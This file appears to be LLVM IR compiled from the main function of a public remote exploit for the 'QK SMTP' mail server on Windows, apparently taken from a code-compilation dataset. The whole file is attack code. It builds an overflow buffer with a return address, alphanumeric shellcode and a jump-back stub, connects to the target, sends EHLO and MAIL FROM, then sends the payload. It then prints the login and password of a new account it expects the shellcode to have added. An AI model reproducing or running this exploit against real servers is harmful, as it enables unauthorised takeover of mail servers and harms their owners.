; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_2649.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_2649.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i8*, i8 }

@MAX_ENCODED_LEN = common dso_local global i32 0, align 4
@SC_MAX_SIZE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [22 x i8] c"[+] Target OS is: %s\0A\00", align 1
@targets = common dso_local global %struct.TYPE_2__* null, align 8
@.str.1 = private unnamed_addr constant [28 x i8] c"[+] Creating evil buffer...\00", align 1
@stdout = common dso_local global i32 0, align 4
@BUFFSIZE = common dso_local global i32 0, align 4
@BUGSTR = common dso_local global i8* null, align 8
@NETADD_USER = common dso_local global i8* null, align 8
@NETADD_PASS = common dso_local global i8* null, align 8
@alphanum_shellcode = common dso_local global i8* null, align 8
@RET_OFFSET = common dso_local global i32 0, align 4
@SHELLCODE_OFFSET = common dso_local global i32 0, align 4
@JMPBACK_OFFSET = common dso_local global i32 0, align 4
@jmpback = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [6 x i8] c"done\0A\00", align 1
@.str.3 = private unnamed_addr constant [31 x i8] c"[+] Connecting to remote host\0A\00", align 1
@.str.4 = private unnamed_addr constant [36 x i8] c"\0A[X] Error while recieving banner!\0A\00", align 1
@.str.5 = private unnamed_addr constant [8 x i8] c"QK SMTP\00", align 1
@.str.6 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@HELO = common dso_local global i8* null, align 8
@.str.7 = private unnamed_addr constant [18 x i8] c"[+] Sending EHLO\0A\00", align 1
@.str.8 = private unnamed_addr constant [27 x i8] c"[X] Failed to send buffer\0A\00", align 1
@MAIL_FROM = common dso_local global i8* null, align 8
@.str.9 = private unnamed_addr constant [23 x i8] c"[+] Sending MAIL FROM\0A\00", align 1
@.str.10 = private unnamed_addr constant [21 x i8] c"[+] Sending EXPLOIT\0A\00", align 1
@.str.11 = private unnamed_addr constant [48 x i8] c"[+] Done - New account should have been added:\0A\00", align 1
@.str.12 = private unnamed_addr constant [15 x i8] c"[i] LOGIN:\09%s\0A\00", align 1
@.str.13 = private unnamed_addr constant [18 x i8] c"[i] PASSWORD:\09%s\0A\00", align 1
@.str.14 = private unnamed_addr constant [36 x i8] c"[+] Exploit now hangs up. see ya.\0A\0A\00", align 1
@.str.15 = private unnamed_addr constant [40 x i8] c"[X] This server is not running QK SMTP\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca i64, align 8
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca [256 x i8], align 16
  %15 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %16 = load i32, i32* @MAX_ENCODED_LEN, align 4
  %17 = zext i32 %16 to i64
  %18 = call i8* @llvm.stacksave()
  store i8* %18, i8** %8, align 8
  %19 = alloca i8, i64 %17, align 16
  store i64 %17, i64* %9, align 8
  %20 = load i32, i32* @MAX_ENCODED_LEN, align 4
  %21 = zext i32 %20 to i64
  %22 = alloca i8, i64 %21, align 16
  store i64 %21, i64* %10, align 8
  %23 = load i32, i32* @SC_MAX_SIZE, align 4
  %24 = zext i32 %23 to i64
  %25 = alloca i8, i64 %24, align 16
  store i64 %24, i64* %15, align 8
  %26 = call i32 (...) @banner()
  %27 = load i32, i32* %4, align 4
  %28 = icmp ne i32 %27, 4
  br i1 %28, label %41, label %29

29:                                               ; preds = %2
  %30 = load i8**, i8*** %5, align 8
  %31 = getelementptr inbounds i8*, i8** %30, i64 2
  %32 = load i8*, i8** %31, align 8
  %33 = call i64 @atoi(i8* %32)
  %34 = icmp ult i64 %33, 1
  br i1 %34, label %41, label %35

35:                                               ; preds = %29
  %36 = load i8**, i8*** %5, align 8
  %37 = getelementptr inbounds i8*, i8** %36, i64 2
  %38 = load i8*, i8** %37, align 8
  %39 = call i64 @atoi(i8* %38)
  %40 = icmp ugt i64 %39, 65534
  br i1 %40, label %41, label %46

41:                                               ; preds = %35, %29, %2
  %42 = load i8**, i8*** %5, align 8
  %43 = getelementptr inbounds i8*, i8** %42, i64 0
  %44 = load i8*, i8** %43, align 8
  %45 = call i32 @usage(i8* %44)
  br label %46

46:                                               ; preds = %41, %35
  %47 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %48 = load i8**, i8*** %5, align 8
  %49 = getelementptr inbounds i8*, i8** %48, i64 3
  %50 = load i8*, i8** %49, align 8
  %51 = call i64 @atoi(i8* %50)
  %52 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %47, i64 %51
  %53 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %52, i32 0, i32 0
  %54 = load i8*, i8** %53, align 8
  %55 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str, i64 0, i64 0), i8* %54)
  %56 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.1, i64 0, i64 0))
  %57 = load i32, i32* @stdout, align 4
  %58 = call i32 @fflush(i32 %57)
  %59 = load i32, i32* @BUFFSIZE, align 4
  %60 = call i64 @malloc(i32 %59)
  %61 = inttoptr i64 %60 to i8*
  store i8* %61, i8** %12, align 8
  %62 = load i32, i32* @BUFFSIZE, align 4
  %63 = load i8*, i8** @BUGSTR, align 8
  %64 = call i32 @strlen(i8* %63)
  %65 = add nsw i32 %62, %64
  %66 = call i64 @malloc(i32 %65)
  %67 = inttoptr i64 %66 to i8*
  store i8* %67, i8** %13, align 8
  %68 = load i8*, i8** %12, align 8
  %69 = load i32, i32* @BUFFSIZE, align 4
  %70 = call i32 @memset(i8* %68, i32 115, i32 %69)
  %71 = load i8*, i8** %12, align 8
  %72 = getelementptr inbounds i8, i8* %71, i64 4000
  %73 = call i32 @memset(i8* %72, i32 69, i32 1000)
  %74 = load i8*, i8** @NETADD_USER, align 8
  %75 = load i8*, i8** @NETADD_USER, align 8
  %76 = call i32 @strlen(i8* %75)
  %77 = call i32 @encode_alphanum(i8* %19, i8* %74, i32 %76)
  %78 = load i8*, i8** @NETADD_PASS, align 8
  %79 = load i8*, i8** @NETADD_PASS, align 8
  %80 = call i32 @strlen(i8* %79)
  %81 = call i32 @encode_alphanum(i8* %22, i8* %78, i32 %80)
  %82 = load i8*, i8** @alphanum_shellcode, align 8
  %83 = call i32 (i8*, i8*, i8*, ...) @sprintf(i8* %25, i8* %82, i8* %19, i8* %22, i8* %19)
  %84 = load i8*, i8** %12, align 8
  %85 = load i32, i32* @RET_OFFSET, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds i8, i8* %84, i64 %86
  %88 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %89 = load i8**, i8*** %5, align 8
  %90 = getelementptr inbounds i8*, i8** %89, i64 3
  %91 = load i8*, i8** %90, align 8
  %92 = call i64 @atoi(i8* %91)
  %93 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %88, i64 %92
  %94 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %93, i32 0, i32 1
  %95 = call i32 @memcpy(i8* %87, i8* %94, i32 4)
  %96 = load i8*, i8** %12, align 8
  %97 = load i32, i32* @SHELLCODE_OFFSET, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds i8, i8* %96, i64 %98
  %100 = call i32 @strlen(i8* %25)
  %101 = call i32 @memcpy(i8* %99, i8* %25, i32 %100)
  %102 = load i8*, i8** %12, align 8
  %103 = load i32, i32* @JMPBACK_OFFSET, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds i8, i8* %102, i64 %104
  %106 = load i8*, i8** @jmpback, align 8
  %107 = load i8*, i8** @jmpback, align 8
  %108 = call i32 @strlen(i8* %107)
  %109 = call i32 @memcpy(i8* %105, i8* %106, i32 %108)
  %110 = load i8*, i8** %12, align 8
  %111 = getelementptr inbounds i8, i8* %110, i64 4500
  %112 = call i32 @memset(i8* %111, i32 0, i32 1)
  %113 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i64 0, i64 0))
  %114 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.3, i64 0, i64 0))
  %115 = load i8**, i8*** %5, align 8
  %116 = getelementptr inbounds i8*, i8** %115, i64 1
  %117 = load i8*, i8** %116, align 8
  %118 = load i8**, i8*** %5, align 8
  %119 = getelementptr inbounds i8*, i8** %118, i64 2
  %120 = load i8*, i8** %119, align 8
  %121 = call i64 @atoi(i8* %120)
  %122 = call i32 @remote_connect(i8* %117, i64 %121)
  store i32 %122, i32* %6, align 4
  %123 = load i32, i32* %6, align 4
  %124 = getelementptr inbounds [256 x i8], [256 x i8]* %14, i64 0, i64 0
  %125 = call i32 @recv(i32 %123, i8* %124, i32 256, i32 0)
  store i32 %125, i32* %11, align 4
  %126 = icmp ult i32 %125, 0
  br i1 %126, label %127, label %130

127:                                              ; preds = %46
  %128 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.4, i64 0, i64 0))
  %129 = call i32 @exit(i32 1) #4
  unreachable

130:                                              ; preds = %46
  %131 = getelementptr inbounds [256 x i8], [256 x i8]* %14, i64 0, i64 0
  %132 = call i64 @strstr(i8* %131, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i64 0, i64 0))
  %133 = icmp ne i64 %132, 0
  br i1 %133, label %134, label %188

134:                                              ; preds = %130
  %135 = call i32 @sleep(i32 1)
  %136 = load i8*, i8** %13, align 8
  %137 = load i8*, i8** @HELO, align 8
  %138 = call i32 (i8*, i8*, i8*, ...) @sprintf(i8* %136, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.6, i64 0, i64 0), i8* %137)
  %139 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.7, i64 0, i64 0))
  %140 = load i32, i32* %6, align 4
  %141 = load i8*, i8** %13, align 8
  %142 = load i8*, i8** %13, align 8
  %143 = call i32 @strlen(i8* %142)
  %144 = call i64 @send(i32 %140, i8* %141, i32 %143, i32 0)
  %145 = icmp sle i64 %144, 0
  br i1 %145, label %146, label %149

146:                                              ; preds = %134
  %147 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.8, i64 0, i64 0))
  %148 = call i32 @exit(i32 1) #4
  unreachable

149:                                              ; preds = %134
  %150 = call i32 @sleep(i32 1)
  %151 = load i8*, i8** %13, align 8
  %152 = load i8*, i8** @MAIL_FROM, align 8
  %153 = call i32 (i8*, i8*, i8*, ...) @sprintf(i8* %151, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.6, i64 0, i64 0), i8* %152)
  %154 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.9, i64 0, i64 0))
  %155 = load i32, i32* %6, align 4
  %156 = load i8*, i8** %13, align 8
  %157 = load i8*, i8** %13, align 8
  %158 = call i32 @strlen(i8* %157)
  %159 = call i64 @send(i32 %155, i8* %156, i32 %158, i32 0)
  %160 = icmp sle i64 %159, 0
  br i1 %160, label %161, label %164

161:                                              ; preds = %149
  %162 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.8, i64 0, i64 0))
  %163 = call i32 @exit(i32 1) #4
  unreachable

164:                                              ; preds = %149
  %165 = call i32 @sleep(i32 1)
  %166 = load i8*, i8** %13, align 8
  %167 = load i8*, i8** @BUGSTR, align 8
  %168 = load i8*, i8** %12, align 8
  %169 = call i32 (i8*, i8*, i8*, ...) @sprintf(i8* %166, i8* %167, i8* %168)
  %170 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.10, i64 0, i64 0))
  %171 = load i32, i32* %6, align 4
  %172 = load i8*, i8** %13, align 8
  %173 = load i8*, i8** %13, align 8
  %174 = call i32 @strlen(i8* %173)
  %175 = call i64 @send(i32 %171, i8* %172, i32 %174, i32 0)
  %176 = icmp sle i64 %175, 0
  br i1 %176, label %177, label %180

177:                                              ; preds = %164
  %178 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.8, i64 0, i64 0))
  %179 = call i32 @exit(i32 1) #4
  unreachable

180:                                              ; preds = %164
  %181 = call i32 @sleep(i32 1)
  %182 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.11, i64 0, i64 0))
  %183 = load i8*, i8** @NETADD_USER, align 8
  %184 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.12, i64 0, i64 0), i8* %183)
  %185 = load i8*, i8** @NETADD_PASS, align 8
  %186 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.13, i64 0, i64 0), i8* %185)
  %187 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.14, i64 0, i64 0))
  br label %190

188:                                              ; preds = %130
  %189 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.15, i64 0, i64 0))
  br label %190

190:                                              ; preds = %188, %180
  %191 = load i32, i32* %6, align 4
  %192 = call i32 @close(i32 %191)
  %193 = load i8*, i8** %12, align 8
  %194 = call i32 @free(i8* %193)
  %195 = load i8*, i8** %13, align 8
  %196 = call i32 @free(i8* %195)
  store i32 0, i32* %3, align 4
  %197 = load i8*, i8** %8, align 8
  call void @llvm.stackrestore(i8* %197)
  %198 = load i32, i32* %3, align 4
  ret i32 %198
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @banner(...) #2

declare dso_local i64 @atoi(i8*) #2

declare dso_local i32 @usage(i8*) #2

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @fflush(i32) #2

declare dso_local i64 @malloc(i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @encode_alphanum(i8*, i8*, i32) #2

declare dso_local i32 @sprintf(i8*, i8*, i8*, ...) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

declare dso_local i32 @remote_connect(i8*, i64) #2

declare dso_local i32 @recv(i32, i8*, i32, i32) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i64 @strstr(i8*, i8*) #2

declare dso_local i32 @sleep(i32) #2

declare dso_local i64 @send(i32, i8*, i32, i32) #2

declare dso_local i32 @close(i32) #2

declare dso_local i32 @free(i8*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
